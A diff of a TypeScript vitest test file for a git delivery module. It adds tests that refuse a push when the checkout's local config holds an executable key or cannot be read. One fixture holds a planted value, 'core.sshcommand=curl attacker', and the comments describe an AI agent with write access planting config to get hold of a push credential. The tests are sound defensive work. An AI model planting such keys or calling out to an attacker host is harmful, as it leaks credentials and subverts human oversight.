@@ -1,35 +1,50 @@
 import { describe, it, expect, vi } from "vitest";
 import { createDelivery } from "./delivery.js";
-import { CommandResult } from "./exec.js";
+import { CommandResult, RunOpts } from "./exec.js";
 import { ClaimedTask } from "./types.js";
+import { claimedTask } from "./__fixtures__/task.js";
 
-const task: ClaimedTask = {
-  taskId: "t1",
-  taskKey: "CP-158",
-  taskNumber: 158,
-  title: "Add a thing",
-  description: "",
-  acceptanceCriteria: [],
-  attempts: 1,
-};
+const task = claimedTask();
 
 const ok: CommandResult = { code: 0, stdout: "", stderr: "", timedOut: false };
 
+// The refuseIfPlanted pre-flight goes through git-safety, which prepends "-c key=value" pairs.
+// Delivery's own calls carry none — their hardening is in the environment — so this only ever
+// strips the pre-flight's.
+function withoutConfigFlags(args: string[]): string[] {
+  const rest = [...args];
+  while (rest[0] === "-c") rest.splice(0, 2);
+  return rest;
+}
+
 function fakeCli(responses: Record<string, Partial<CommandResult>>) {
-  const run = vi.fn(async (command: string, args: string[]): Promise<CommandResult> => {
-    const line = `${command} ${args.join(" ")}`;
+  const run = vi.fn(async (
+    command: string,
+    args: string[],
+    _opts?: RunOpts
+  ): Promise<CommandResult> => {
+    const line = `${command} ${withoutConfigFlags(args).join(" ")}`;
     const key = Object.keys(responses).find((prefix) => line.startsWith(prefix));
     return { ...ok, ...(key ? responses[key] : {}) };
   });
   return { runner: { run }, run };
 }
 
+// push begins with a `git config --local --list` pre-flight (see refuseIfPlanted), which runs
+// through git-safety rather than delivery's own hardening and is not the call any of these
+// assertions is about.
+function deliveryCalls(run: ReturnType<typeof vi.fn>): unknown[][] {
+  return run.mock.calls.filter(
+    ([, args]) => !withoutConfigFlags(args as string[]).join(" ").startsWith("config --local")
+  );
+}
+
 function argsOf(run: ReturnType<typeof vi.fn>, index = 0): string[] {
-  return run.mock.calls[index][1] as string[];
+  return deliveryCalls(run)[index][1] as string[];
 }
 
 function envOf(run: ReturnType<typeof vi.fn>, index = 0): Record<string, string> {
-  return (run.mock.calls[index][2] as { env: Record<string, string> }).env;
+  return (deliveryCalls(run)[index][2] as { env: Record<string, string> }).env;
 }
 
 // git reads GIT_CONFIG_KEY_n / GIT_CONFIG_VALUE_n as ordered pairs, so the assertions read them
@@ -84,8 +99,25 @@ describe("push", () => {
   });
 
   it("names the timeout instead of throwing an empty error when the push hangs", async () => {
-    const run = vi.fn().mockResolvedValue({ code: -1, stdout: "", stderr: "", timedOut: true });
-    await expect(createDelivery({ run }).push("/wt", "cp-158/worker")).rejects.toThrow(/timed out/);
+    const { runner } = fakeCli({ "git push": { code: -1, timedOut: true } });
+    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(/timed out/);
+  });
+
+  // bindRepository scanned this config before the agent ever saw the checkout, and the agent holds
+  // Write; push is the call that hands whatever it planted a credential
+  it("refuses to push when the agent planted an executable key in the checkout's config", async () => {
+    const { runner } = fakeCli({
+      "git config --local --list": { stdout: "core.sshcommand=curl attacker\n" },
+    });
+    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(
+      /core\.sshcommand/
+    );
+  });
+
+  it("does not push when the config cannot be read at all", async () => {
+    const { runner, run } = fakeCli({ "git config --local --list": { code: 128 } });
+    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(/refusing/);
+    expect(run.mock.calls.some(([, args]) => (args as string[]).includes("push"))).toBe(false);
   });
 
   // What the repository config can still make git execute on our behalf. That the flags are spelled
